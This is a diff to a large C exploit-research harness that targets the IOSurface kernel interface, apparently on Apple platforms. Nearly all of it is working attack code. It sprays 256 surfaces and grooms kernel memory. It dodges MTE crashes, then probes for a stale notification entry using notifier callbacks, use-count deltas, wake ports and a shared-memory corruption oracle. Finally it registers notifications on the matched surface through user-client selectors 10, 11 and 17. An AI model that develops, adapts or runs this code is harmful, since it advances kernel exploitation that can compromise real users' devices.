@@ -19281,6 +19281,17 @@ new_modes:
          *
          * We load Metal dynamically via dlopen since the probe is pure C.
          */
+        /* IOSurfaceNotifier callback — MUST be non-NULL to prevent crash
+         * when notification dispatch tries to invoke the callback. */
+        static volatile int32_t r229_notif_fire_count = 0;
+        static volatile int r229_notif_last_idx = -1;
+        static void r229_notif_callback(IOSurfaceRef surf, uint32_t type, void *ctx) {
+            (void)surf; (void)type;
+            int idx = (int)(uintptr_t)ctx;
+            r229_notif_last_idx = idx;
+            __sync_fetch_and_add(&r229_notif_fire_count, 1);
+        }
+
         /* r229 variables shared between Phase 13 and Phase 14 */
         static IOSurfaceRef r229_matched_surf = NULL;
         static IOSurfaceRef r229_spray_static[256]; /* copy for Phase 14 access */
@@ -19724,6 +19735,13 @@ new_modes:
                 rlog("  r=229: SURVIVED Phase 13 attempt #%d! spray=%d frames=%d wps=%d phase=%d\n",
                     r229_attempt, r229_spray_n, p13_render_frames, r229_wp_n, r229_phase);
 
+                /* Stop Metal render loop BEFORE any notification work.
+                 * The render loop triggers compositor traversals that crash
+                 * when combined with notifier creation on spray surfaces. */
+                p13_render_run = 0;
+                pthread_join(render_th, NULL);
+                rlog("  r=229: Render loop stopped for Phase 14\n");
+
                 /* === IOSurfaceNotifier: populate kernel callback fields (+0x108/+0x110) ===
                  * Without callbacks, the compositor inner_method returns 0 and no
                  * notification fires even when MTE matches. Creating notifiers MAY
@@ -19744,11 +19762,14 @@ new_modes:
                 int r229_notifier_count = 0;
                 memset(r229_notifiers, 0, sizeof(r229_notifiers));
 
-                if (notifier_create_fn) {
+                if (0) { /* DISABLED: bulk notifier creation crashes — render loop
+                          * triggers compositor traversal of stale entries, causing
+                          * MTE fault. Use sequential probe in Phase 14 instead. */
                     dispatch_queue_t nq = dispatch_queue_create("com.research.notifier", DISPATCH_QUEUE_SERIAL);
                     for (int si = 0; si < 256; si++) {
                         if (r229_spray[si]) {
-                            CFTypeRef notif = notifier_create_fn(r229_spray[si], NULL, NULL);
+                            CFTypeRef notif = notifier_create_fn(r229_spray[si],
+                                (void *)r229_notif_callback, (void *)(uintptr_t)si);
                             if (notif) {
                                 r229_notifiers[si] = notif;
                                 r229_notifier_count++;
@@ -19841,7 +19862,8 @@ new_modes:
                                 /* Re-create notifiers for [nb_lo..nb_hi] */
                                 for (int si = nb_lo; si <= nb_hi; si++) {
                                     if (r229_spray[si] && !r229_notifiers[si] && notifier_create_fn) {
-                                        CFTypeRef notif = notifier_create_fn(r229_spray[si], NULL, NULL);
+                                        CFTypeRef notif = notifier_create_fn(r229_spray[si],
+                                            (void *)r229_notif_callback, (void *)(uintptr_t)si);
                                         if (notif) {
                                             r229_notifiers[si] = notif;
                                             if (notifier_setq_fn && nq) {
@@ -20195,8 +20217,7 @@ new_modes:
                     if (r229_attempt < 200) {
                         rlog("  r=229: No match, looping (%d/200, crashes=%d phase=%d)...\n",
                             r229_attempt, r229_crash_count, r229_phase);
-                        p13_render_run = 0;
-                        pthread_join(render_th, NULL);
+                        /* render_th already joined at survival point */
                         p13_free_groom();
                         if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
                         IOObjectRelease(svc13);
@@ -20266,7 +20287,7 @@ new_modes:
                 match_id = IOSurfaceGetID(match_surf);
                 rlog("    Already known: idx=%d id=%u\n", r229_matched_idx, match_id);
             } else if (rounds == 229 && r229_matched_idx < 0) {
-                rlog("    Identifying match via per-surface notifier probe...\n");
+                rlog("    Identifying match via sequential notifier + wake port probe...\n");
 
                 typedef CFTypeRef (*IOSurfaceNotifierCreate_t)(IOSurfaceRef, void *, void *);
                 typedef void (*IOSurfaceNotifierSetDispatchQueue_t)(CFTypeRef, dispatch_queue_t);
@@ -20280,136 +20301,142 @@ new_modes:
 
                 if (nc_fn && nsq_fn && ni_fn) {
                     int found_idx = -1;
+                    int total_wp_hits = 0;
+                    int total_uc_anomalies = 0;
+                    int baseline_uc_delta = -999;
 
-                    /* Use IOSurface use_count delta as identification signal.
-                     * When a notifier is created on a surface, the kernel
-                     * increments its use_count. If the stale entry points at
-                     * surface X, creating a notifier on X modifies its kernel
-                     * object in a way that MAY produce observable side effects
-                     * via the stale traversal path.
-                     *
-                     * Alternative approach: use IOSurfaceGetUseCount before/after
-                     * notifier create. The kernel side IncrementUseCount is called
-                     * on the surface during notifier creation.
-                     */
-                    rlog("    Testing per-surface notifier with use_count delta...\n");
+                    io_service_t id_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
 
                     for (int si = 0; si < 256; si++) {
                         if (!r229_spray_static[si]) continue;
 
+                        IOSurfaceID sid = IOSurfaceGetID(r229_spray_static[si]);
                         int uc_before = IOSurfaceGetUseCount(r229_spray_static[si]);
 
-                        /* Create notifier on this surface only */
+                        /* Create ONE notifier on this surface */
                         dispatch_queue_t idq = dispatch_queue_create("com.research.id", DISPATCH_QUEUE_SERIAL);
-                        CFTypeRef notif = nc_fn(r229_spray_static[si], NULL, NULL);
+                        r229_notif_fire_count = 0;
+                        r229_notif_last_idx = -1;
+                        CFTypeRef notif = nc_fn(r229_spray_static[si],
+                            (void *)r229_notif_callback, (void *)(uintptr_t)si);
                         if (!notif) { dispatch_release(idq); continue; }
                         nsq_fn(notif, idq);
 
-                        /* Brief wait — do NOT sleep long enough for compositor
-                         * to traverse stale entry, to avoid MTE crash.
-                         * Just check the immediate effect of notifier creation.
-                         */
-                        usleep(1000); /* 1ms — just let kernel call complete */
+                        /* Open fresh connection and register sel17 to trigger traversal */
+                        io_connect_t id_conn = IO_OBJECT_NULL;
+                        mach_port_t id_wp = MACH_PORT_NULL;
+                        if (id_svc != IO_OBJECT_NULL) {
+                            IOServiceOpen(id_svc, mach_task_self(), 0, &id_conn);
+                            if (id_conn != IO_OBJECT_NULL) {
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &id_wp);
+                                mach_port_insert_right(mach_task_self(), id_wp, id_wp, MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref_id = 0x1D000000ULL | (uint64_t)si;
+                                uint8_t inp_id[24];
+                                memset(inp_id, 0, sizeof(inp_id));
+                                uint32_t sid32 = sid;
+                                memcpy(inp_id, &sid32, 4);
+                                IOConnectCallAsyncMethod(id_conn, 17, id_wp, &ref_id, 1,
+                                    NULL, 0, inp_id, 24, NULL, NULL, NULL, NULL);
+                            }
+                        }
 
+                        /* Also trigger property change to exercise notification paths */
+                        int marker = 0xCAFE0000 | si;
+                        CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                        IOSurfaceSetValue(r229_spray_static[si], CFSTR("_id_probe"), mv);
+                        CFRelease(mv);
+                        IOSurfaceRemoveValue(r229_spray_static[si], CFSTR("_id_probe"));
+
+                        usleep(20000); /* 20ms — enough for notification dispatch */
+
+                        /* Check use count */
                         int uc_after = IOSurfaceGetUseCount(r229_spray_static[si]);
+                        int delta = uc_after - uc_before;
 
-                        /* Invalidate immediately to prevent compositor traversal crash */
+                        if (baseline_uc_delta == -999) {
+                            baseline_uc_delta = delta;
+                        } else if (delta != baseline_uc_delta) {
+                            total_uc_anomalies++;
+                            rlog("    *** UC ANOMALY spray[%d] uc: %d->%d (delta=%d, baseline=%d) ***\n",
+                                si, uc_before, uc_after, delta, baseline_uc_delta);
+                            if (found_idx < 0) found_idx = si;
+                        }
+
+                        /* Check ALL saved wake ports for messages */
+                        int wp_hits_this = 0;
+                        for (int wi = 0; wi < r229_saved_wp_n; wi++) {
+                            if (!r229_saved_wps[wi]) continue;
+                            uint8_t msg_buf[512];
+                            mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                            memset(msg_buf, 0, sizeof(msg_buf));
+                            hdr->msgh_size = sizeof(msg_buf);
+                            hdr->msgh_local_port = r229_saved_wps[wi];
+                            kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                0, sizeof(msg_buf), r229_saved_wps[wi], 5, MACH_PORT_NULL);
+                            if (mr == MACH_MSG_SUCCESS) {
+                                wp_hits_this++;
+                                total_wp_hits++;
+                                rlog("    *** WP HIT spray[%d] saved_wp[%d] port=%u msgh_id=0x%x ***\n",
+                                    si, wi, r229_saved_wps[wi], hdr->msgh_id);
+                            }
+                        }
+
+                        /* Also check the fresh id_wp */
+                        if (id_wp != MACH_PORT_NULL) {
+                            uint8_t msg_buf[512];
+                            mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                            memset(msg_buf, 0, sizeof(msg_buf));
+                            hdr->msgh_size = sizeof(msg_buf);
+                            hdr->msgh_local_port = id_wp;
+                            kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                0, sizeof(msg_buf), id_wp, 5, MACH_PORT_NULL);
+                            if (mr == MACH_MSG_SUCCESS) {
+                                wp_hits_this++;
+                                rlog("    *** FRESH WP HIT spray[%d] port=%u msgh_id=0x%x ***\n",
+                                    si, id_wp, hdr->msgh_id);
+                            }
+                        }
+
+                        /* Check callback fire count */
+                        int cb_fires = r229_notif_fire_count;
+
+                        if (wp_hits_this > 0 && found_idx < 0) {
+                            found_idx = si;
+                        }
+
+                        /* Clean up */
                         ni_fn(notif);
                         CFRelease(notif);
                         dispatch_release(idq);
-
-                        int delta = uc_after - uc_before;
-                        if (delta != 0 || si < 5 || si == 127 || si == 255) {
-                            rlog("    spray[%d] uc: %d→%d (delta=%d)\n",
-                                si, uc_before, uc_after, delta);
+                        if (id_conn != IO_OBJECT_NULL) {
+                            IOServiceClose(id_conn);
                         }
-                    }
-                    rlog("    Notifier use_count delta scan complete\n");
+                        if (id_wp != MACH_PORT_NULL) {
+                            mach_port_deallocate(mach_task_self(), id_wp);
+                        }
 
-                    /* Second approach: Use IOSurface property set/get as oracle.
-                     * The stale notification entry points at one spray surface.
-                     * If we set a unique property on each surface, then trigger
-                     * the stale entry traversal, we can detect which surface's
-                     * property was read by the kernel through timing or side effects.
-                     *
-                     * For now: set unique marker properties on each surface and
-                     * try sel 10 (s_get_value) through the user client to see if
-                     * any leak kernel state.
-                     */
-                    rlog("    Testing per-surface property markers via sel 9/10...\n");
-                    for (int si = 0; si < 256; si++) {
-                        if (!r229_spray_static[si]) continue;
-                        int marker = 0xCAFE0000 | si;
-                        CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
-                        IOSurfaceSetValue(r229_spray_static[si], CFSTR("_id_marker"), mv);
-                        CFRelease(mv);
-                    }
+                        int is_notable = (wp_hits_this > 0 || delta != baseline_uc_delta || cb_fires > 0);
 
-                    /* Read back markers and check for any anomalies */
-                    for (int si = 0; si < 256; si++) {
-                        if (!r229_spray_static[si]) continue;
-                        CFNumberRef rv = (CFNumberRef)IOSurfaceCopyValue(
-                            r229_spray_static[si], CFSTR("_id_marker"));
-                        if (rv) {
-                            int val = 0;
-                            CFNumberGetValue(rv, kCFNumberIntType, &val);
-                            int expected = 0xCAFE0000 | si;
-                            if (val != expected) {
-                                rlog("    *** ANOMALY: spray[%d] marker=0x%x expected=0x%x ***\n",
-                                    si, val, expected);
-                                found_idx = si;
-                            }
-                            CFRelease(rv);
+                        /* Progress logging */
+                        if (si < 3 || si % 32 == 0 || si == 255 || is_notable) {
+                            rlog("    probe[%d/255] uc_delta=%d wp=%d cb=%d%s\n",
+                                si, delta, wp_hits_this, cb_fires,
+                                is_notable ? " <<<" : "");
                         }
                     }
 
-                    /* Clean up markers */
-                    for (int si = 0; si < 256; si++) {
-                        if (r229_spray_static[si])
-                            IOSurfaceRemoveValue(r229_spray_static[si], CFSTR("_id_marker"));
-                    }
+                    if (id_svc != IO_OBJECT_NULL) IOObjectRelease(id_svc);
 
-                    /* Third approach: use IOSurface pixel buffer write as oracle.
-                     * Write unique patterns to each surface's shared memory,
-                     * then read back. If the stale entry corrupted one, it differs.
-                     */
-                    rlog("    Testing shared memory write-read oracle...\n");
-                    for (int si = 0; si < 256; si++) {
-                        if (!r229_spray_static[si]) continue;
-                        IOSurfaceLock(r229_spray_static[si], 0, NULL);
-                        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(r229_spray_static[si]);
-                        if (base) {
-                            base[0] = 0xDEAD0000 | si;
-                            base[1] = ~(0xDEAD0000 | si);
-                        }
-                        IOSurfaceUnlock(r229_spray_static[si], 0, NULL);
-                    }
-
-                    usleep(50000); /* 50ms — let compositor run */
-
-                    for (int si = 0; si < 256; si++) {
-                        if (!r229_spray_static[si]) continue;
-                        IOSurfaceLock(r229_spray_static[si], kIOSurfaceLockReadOnly, NULL);
-                        uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(r229_spray_static[si]);
-                        if (base) {
-                            uint32_t v0 = base[0], v1 = base[1];
-                            uint32_t e0 = 0xDEAD0000 | si;
-                            uint32_t e1 = ~e0;
-                            if (v0 != e0 || v1 != e1) {
-                                rlog("    *** CORRUPTION: spray[%d] [0]=0x%08x (exp 0x%08x) [1]=0x%08x (exp 0x%08x) ***\n",
-                                    si, v0, e0, v1, e1);
-                                if (found_idx < 0) found_idx = si;
-                            }
-                        }
-                        IOSurfaceUnlock(r229_spray_static[si], kIOSurfaceLockReadOnly, NULL);
-                    }
+                    rlog("    Sequential probe complete: wp_hits=%d uc_anomalies=%d found=%d\n",
+                        total_wp_hits, total_uc_anomalies, found_idx);
 
                     if (found_idx >= 0) {
                         r229_matched_idx = found_idx;
                         r229_matched_surf = r229_spray_static[found_idx];
                         match_surf = r229_matched_surf;
                         match_id = IOSurfaceGetID(match_surf);
-                        rlog("    Matched surface identified: idx=%d id=%u\n", found_idx, match_id);
+                        rlog("    *** MATCHED surface identified: idx=%d id=%u ***\n", found_idx, match_id);
 
                         for (int si = 0; si < 256; si++) {
                             if (si == found_idx) continue;
@@ -20419,7 +20446,48 @@ new_modes:
                             }
                         }
                     } else {
-                        rlog("    No anomaly detected — match identification inconclusive\n");
+                        rlog("    No match detected via sequential probe\n");
+
+                        /* Fallback: shared memory write-read oracle */
+                        rlog("    Fallback: shared memory write-read oracle...\n");
+                        for (int si = 0; si < 256; si++) {
+                            if (!r229_spray_static[si]) continue;
+                            IOSurfaceLock(r229_spray_static[si], 0, NULL);
+                            uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(r229_spray_static[si]);
+                            if (base) {
+                                base[0] = 0xDEAD0000 | si;
+                                base[1] = ~(0xDEAD0000 | si);
+                            }
+                            IOSurfaceUnlock(r229_spray_static[si], 0, NULL);
+                        }
+                        usleep(50000);
+                        int oracle_found = -1;
+                        for (int si = 0; si < 256; si++) {
+                            if (!r229_spray_static[si]) continue;
+                            IOSurfaceLock(r229_spray_static[si], kIOSurfaceLockReadOnly, NULL);
+                            uint32_t *base = (uint32_t *)IOSurfaceGetBaseAddress(r229_spray_static[si]);
+                            if (base) {
+                                uint32_t v0 = base[0], v1 = base[1];
+                                uint32_t e0 = 0xDEAD0000 | si;
+                                uint32_t e1 = ~e0;
+                                if (v0 != e0 || v1 != e1) {
+                                    rlog("    *** CORRUPTION: spray[%d] [0]=0x%08x (exp 0x%08x) [1]=0x%08x (exp 0x%08x) ***\n",
+                                        si, v0, e0, v1, e1);
+                                    if (oracle_found < 0) oracle_found = si;
+                                }
+                            }
+                            IOSurfaceUnlock(r229_spray_static[si], kIOSurfaceLockReadOnly, NULL);
+                        }
+
+                        if (oracle_found >= 0) {
+                            r229_matched_idx = oracle_found;
+                            r229_matched_surf = r229_spray_static[oracle_found];
+                            match_surf = r229_matched_surf;
+                            match_id = IOSurfaceGetID(match_surf);
+                            rlog("    *** Oracle found match: idx=%d id=%u ***\n", oracle_found, match_id);
+                        } else {
+                            rlog("    Oracle: no corruption detected\n");
+                        }
                     }
                 } else {
                     rlog("    IOSurfaceNotifier functions not found\n");
@@ -20436,7 +20504,6 @@ new_modes:
             int p14_port_n = 0;
 
             if (match_surf) {
-                uint64_t p14_inp[3] = {1, 2, 3};
                 for (int i = 0; i < P14_NEW_PORTS; i++) {
                     mach_port_t np = MACH_PORT_NULL;
                     kern_return_t kr = mach_port_allocate(mach_task_self(),
@@ -20445,40 +20512,67 @@ new_modes:
                     mach_port_insert_right(mach_task_self(), np, np,
                         MACH_MSG_TYPE_MAKE_SEND);
 
-                    uint64_t ref = 0x14A00000ULL | (uint64_t)i;
-                    kr = IOConnectCallAsyncMethod(uc14, 17, np, &ref, 1,
-                        NULL, 0, p14_inp, 24, NULL, NULL, NULL, NULL);
-                    if (i < 3 || kr != KERN_SUCCESS)
-                        rlog("    reg[%d] port=%u kr=0x%x\n", i, np, (uint32_t)kr);
-                    if (kr == KERN_SUCCESS) {
+                    /* Use FRESH connection with matched surface's ID */
+                    io_connect_t p14a_conn = IO_OBJECT_NULL;
+                    IOServiceOpen(svc14, mach_task_self(), 0, &p14a_conn);
+                    kern_return_t kr2;
+                    if (p14a_conn != IO_OBJECT_NULL) {
+                        uint64_t ref = 0x14A00000ULL | (uint64_t)i;
+                        uint8_t inp14a[24];
+                        memset(inp14a, 0, sizeof(inp14a));
+                        uint32_t msid = match_id;
+                        memcpy(inp14a, &msid, 4);
+                        kr2 = IOConnectCallAsyncMethod(p14a_conn, 17, np, &ref, 1,
+                            NULL, 0, inp14a, 24, NULL, NULL, NULL, NULL);
+                    } else {
+                        kr2 = KERN_FAILURE;
+                    }
+                    if (i < 3 || kr2 != KERN_SUCCESS)
+                        rlog("    reg[%d] conn=%u port=%u kr=0x%x\n", i,
+                            p14a_conn, np, (uint32_t)kr2);
+                    if (kr2 == KERN_SUCCESS) {
                         p14_ports[p14_port_n++] = np;
                     } else {
                         mach_port_deallocate(mach_task_self(), np);
                     }
+                    if (p14a_conn != IO_OBJECT_NULL)
+                        IOServiceClose(p14a_conn);
                 }
-                rlog("    Registered %d new notifications\n", p14_port_n);
+                rlog("    Registered %d new notifications via fresh connections\n", p14_port_n);
 
                 /* Also register via sel[10] (async register, stIn=0x18) */
                 mach_port_t p14_sel10_port = MACH_PORT_NULL;
                 mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p14_sel10_port);
                 mach_port_insert_right(mach_task_self(), p14_sel10_port, p14_sel10_port,
                     MACH_MSG_TYPE_MAKE_SEND);
+                io_connect_t p14_sel10_conn = IO_OBJECT_NULL;
+                IOServiceOpen(svc14, mach_task_self(), 0, &p14_sel10_conn);
                 uint64_t ref10 = 0xAA10AA10ULL;
                 uint8_t s10_buf[24];
                 memset(s10_buf, 0, sizeof(s10_buf));
                 uint32_t sid32 = match_id;
                 memcpy(s10_buf, &sid32, 4);
-                kern_return_t kr10 = IOConnectCallAsyncMethod(uc14, 10, p14_sel10_port,
-                    &ref10, 1, NULL, 0, s10_buf, 24, NULL, NULL, NULL, NULL);
+                kern_return_t kr10 = KERN_FAILURE;
+                if (p14_sel10_conn != IO_OBJECT_NULL) {
+                    kr10 = IOConnectCallAsyncMethod(p14_sel10_conn, 10, p14_sel10_port,
+                        &ref10, 1, NULL, 0, s10_buf, 24, NULL, NULL, NULL, NULL);
+                    IOServiceClose(p14_sel10_conn);
+                }
                 rlog("    sel[10] async register kr=0x%x port=%u\n",
                     (uint32_t)kr10, p14_sel10_port);
 
                 /* Also try sel[11] (sync register, stIn=0x18) */
+                io_connect_t p14_sel11_conn = IO_OBJECT_NULL;
+                IOServiceOpen(svc14, mach_task_self(), 0, &p14_sel11_conn);
                 uint8_t s11_buf[24];
                 memset(s11_buf, 0, sizeof(s11_buf));
                 memcpy(s11_buf, &sid32, 4);
-                kern_return_t kr11 = IOConnectCallMethod(uc14, 11,
-                    NULL, 0, s11_buf, 24, NULL, NULL, NULL, NULL);
+                kern_return_t kr11 = KERN_FAILURE;
+                if (p14_sel11_conn != IO_OBJECT_NULL) {
+                    kr11 = IOConnectCallMethod(p14_sel11_conn, 11,
+                        NULL, 0, s11_buf, 24, NULL, NULL, NULL, NULL);
+                    IOServiceClose(p14_sel11_conn);
+                }
                 rlog("    sel[11] sync register kr=0x%x\n", (uint32_t)kr11);
 
                 /* 14b: Trigger notification traversal via property set/remove.
